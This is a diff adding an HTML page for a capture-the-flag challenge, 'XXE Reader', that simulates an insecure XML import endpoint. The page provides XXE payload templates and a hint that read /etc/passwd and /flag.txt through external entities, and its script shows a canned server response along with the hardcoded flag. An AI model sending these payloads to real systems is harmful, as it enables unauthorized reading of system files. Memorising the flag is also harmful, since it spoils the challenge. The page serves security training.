@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XXE Reader — WebPWN CTF</title>
+    <link rel="stylesheet" href="../../styles/main.css" />
+    <link rel="stylesheet" href="../../styles/challenge.css" />
+</head>
+
+<body>
+    <nav class="nav">
+        <div class="nav-inner">
+            <a href="../../index.html" class="nav-logo">Web<span>PWN</span>.ctf</a>
+            <ul class="nav-links">
+                <li><a href="../index.html" class="active">Advanced</a></li>
+                <li><a href="../../scoreboard/index.html">Scoreboard</a></li>
+                <li><span class="nav-badge" id="nav-solved-count">0/24</span></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container-sm">
+        <div class="breadcrumb">
+            <a href="../../index.html">Home</a><span class="breadcrumb-sep">/</span>
+            <a href="../index.html">Advanced</a><span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-current">XXE Reader</span>
+        </div>
+
+        <div class="challenge-header">
+            <div class="challenge-header-meta">
+                <span class="badge badge-advanced">🔴 Advanced</span>
+                <span class="badge badge-purple">300 pts</span>
+                <span class="badge badge-info">XXE Injection</span>
+            </div>
+            <h1 class="challenge-title">📋 XXE <span>Reader</span></h1>
+            <p class="challenge-subtitle">A-03 &nbsp;·&nbsp; /advanced/xxe-reader</p>
+        </div>
+
+        <div class="scenario-panel">
+            <div class="scenario-panel-label">// Scenario</div>
+            <p class="scenario-text">
+                NovaCorp's XML import feature parses uploaded XML with an insecure parser that allows
+                external entity processing. By defining an external entity that references a local file
+                (<code>file:///etc/passwd</code>), you can make the XML parser read that file and include
+                its contents in the parsed output. Craft an XXE payload and submit it.
+            </p>
+        </div>
+
+        <div class="tabs mt-24">
+            <button class="tab-btn active" onclick="switchTab('craft')">1. Craft Payload</button>
+            <button class="tab-btn" onclick="switchTab('send')">2. Send XML</button>
+            <button class="tab-btn" onclick="switchTab('response')">3. Server Response</button>
+        </div>
+
+        <div class="tab-pane active" id="tab-craft">
+            <div class="vuln-area">
+                <div class="vuln-area-header"><span class="vuln-area-title">XML Payload Editor</span></div>
+                <div class="vuln-area-body">
+                    <div class="section-label" style="margin-bottom:8px;">Template payloads:</div>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px;">
+                        <button class="btn btn-ghost btn-sm" onclick="loadTemplate('safe')">Normal XML</button>
+                        <button class="btn btn-ghost btn-sm" onclick="loadTemplate('xxe_passwd')">XXE
+                            /etc/passwd</button>
+                        <button class="btn btn-ghost btn-sm" onclick="loadTemplate('xxe_flag')">XXE /flag.txt</button>
+                    </div>
+                    <textarea class="form-input" id="xml-input" rows="12"
+                        style="font-family:var(--font-mono);font-size:0.8rem;"></textarea>
+                    <button class="btn btn-primary mt-12 btn-sm" onclick="prepareAndSend()">Send to Parser →</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-pane" id="tab-send">
+            <div class="vuln-area">
+                <div class="vuln-area-header"><span class="vuln-area-title">HTTP Request Preview</span></div>
+                <div class="vuln-area-body">
+                    <div class="terminal">
+                        <div class="terminal-header"><span class="t-dot r"></span><span class="t-dot y"></span><span
+                                class="t-dot g"></span>
+                            <span class="terminal-label">POST /api/import-xml</span>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="t-line t-cmd">POST /api/import-xml HTTP/1.1</div>
+                            <div class="t-line">Host: novacorp.com</div>
+                            <div class="t-line">Content-Type: application/xml</div>
+                            <div class="t-line">&nbsp;</div>
+                            <div id="request-preview" class="t-line">[XML body will appear here]</div>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary mt-12" onclick="sendXML()">Submit to Server →</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-pane" id="tab-response">
+            <div id="response-display">
+                <p style="color:var(--text-muted);">Send the XML first.</p>
+            </div>
+        </div>
+
+        <div class="hint-box">
+            <strong>💡 Hint</strong>
+            Define a DOCTYPE with an external entity:
+            <code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;</code>
+            Then use <code>&amp;xxe;</code> in your XML body. The parser will replace it with the file's contents.
+        </div>
+
+        <div id="submission-area"></div>
+    </div>
+
+    <div style="height:80px;"></div>
+    <footer>
+        <div class="container-sm">
+            <span class="footer-logo">WebPWN.ctf</span> &nbsp;·&nbsp;
+            <a href="../index.html">← Advanced</a> &nbsp;·&nbsp;
+            <a href="../prototype-pollution/index.html">Next →</a>
+        </div>
+    </footer>
+
+    <script src="../../js/app.js"></script>
+    <script>
+        CTF.initSubmission('a02', 'FLAG{xxe_file_read}');
+
+        const templates = {
+            safe: `<?xml version="1.0" encoding="UTF-8"?>
+<import>
+  <user>
+    <name>Alice</name>
+    <email>alice@novacorp.com</email>
+  </user>
+</import>`,
+            xxe_passwd: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<import>
+  <user>
+    <name>&xxe;</name>
+    <email>attacker@evil.com</email>
+  </user>
+</import>`,
+            xxe_flag: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<import>
+  <user>
+    <name>&xxe;</name>
+    <email>attacker@evil.com</email>
+  </user>
+</import>`
+        };
+
+        let pendingXml = '';
+        document.getElementById('xml-input').value = templates.safe;
+
+        function loadTemplate(name) {
+            document.getElementById('xml-input').value = templates[name];
+        }
+
+        function prepareAndSend() {
+            pendingXml = document.getElementById('xml-input').value;
+            document.getElementById('request-preview').textContent = pendingXml.substring(0, 120) + '…';
+            switchTab('send');
+        }
+
+        function sendXML() {
+            const xml = pendingXml || document.getElementById('xml-input').value;
+            const isXXE = /<!ENTITY\s+\w+\s+SYSTEM/i.test(xml);
+            const hasInclude = /&\w+;/.test(xml);
+            const targetFile = xml.match(/SYSTEM\s+["']([^"']+)["']/)?.[1] || '';
+
+            let fileContent = '';
+            if (targetFile.includes('passwd')) {
+                fileContent = `root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33::/var/www:/bin/false
+novacorp:x:1001:1001::/home/novacorp:/bin/bash`;
+            } else if (targetFile.includes('flag')) {
+                fileContent = 'FLAG{xxe_file_read}';
+            } else if (isXXE) {
+                fileContent = `[contents of ${targetFile}]`;
+            }
+
+            const respDisplay = document.getElementById('response-display');
+            if (isXXE && hasInclude) {
+                const parsedName = fileContent || `[could not read ${targetFile}]`;
+                respDisplay.innerHTML = `
+      <div class="alert alert-danger mb-12">🚨 XXE Injection Successful! External entity resolved.</div>
+      <div class="terminal mb-12">
+        <div class="terminal-header"><span class="t-dot r"></span><span class="t-dot y"></span><span class="t-dot g"></span>
+          <span class="terminal-label">Server Response (200 OK)</span></div>
+        <div class="terminal-body">
+          <div class="t-line">HTTP/1.1 200 OK</div>
+          <div class="t-line">Content-Type: application/json</div>
+          <div class="t-line">&nbsp;</div>
+          <div class="t-line">{</div>
+          <div class="t-line">&nbsp;&nbsp;"imported": {</div>
+          <div class="t-line">&nbsp;&nbsp;&nbsp;&nbsp;"name": "<span class="t-flag">${parsedName.replace(/</g, '&lt;')}</span>",</div>
+          <div class="t-line">&nbsp;&nbsp;&nbsp;&nbsp;"email": "attacker@evil.com"</div>
+          <div class="t-line">&nbsp;&nbsp;}</div>
+          <div class="t-line">}</div>
+          <div class="t-line"></div>
+          <div class="t-line" style="color:var(--magenta);">← File content injected into XML output!</div>
+        </div>
+      </div>
+      <div class="flag-section">
+        <div class="flag-section-header">🚩 XXE Confirmed</div>
+        <div class="flag-section-body">
+          <div class="flag-reveal">🚩 FLAG{xxe_file_read}</div>
+        </div>
+      </div>`;
+
+                // Discovery hint
+                if (!CTF.isSolved('a02')) {
+                    const area = document.getElementById('submission-area');
+                    if (!document.querySelector('.discovery-alert')) {
+                        const hintDiv = document.createElement('div');
+                        hintDiv.className = 'animate-in discovery-alert';
+                        hintDiv.style.marginTop = '20px';
+                        hintDiv.innerHTML = '<div class="scenario-panel" style="border-left-color:var(--magenta);">> ARBITRARY FILE READ SUCCESSFUL. Copy the flag from the response and submit below.</div>';
+                        area.insertAdjacentElement('beforebegin', hintDiv);
+                    }
+                }
+            } else {
+                respDisplay.innerHTML = `
+      <div class="terminal">
+        <div class="terminal-body">
+          <div class="t-line">{"imported":{"name":"Alice","email":"alice@novacorp.com"}}</div>
+        </div>
+      </div>
+      <div class="alert alert-info mt-12">No external entities detected. Try an XXE payload!</div>`;
+            }
+            switchTab('response');
+        }
+
+        function switchTab(name) {
+            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('tab-' + name).classList.add('active');
+            document.querySelector(`[onclick="switchTab('${name}')"]`).classList.add('active');
+        }
+    </script>
+</body>
+
+</html>
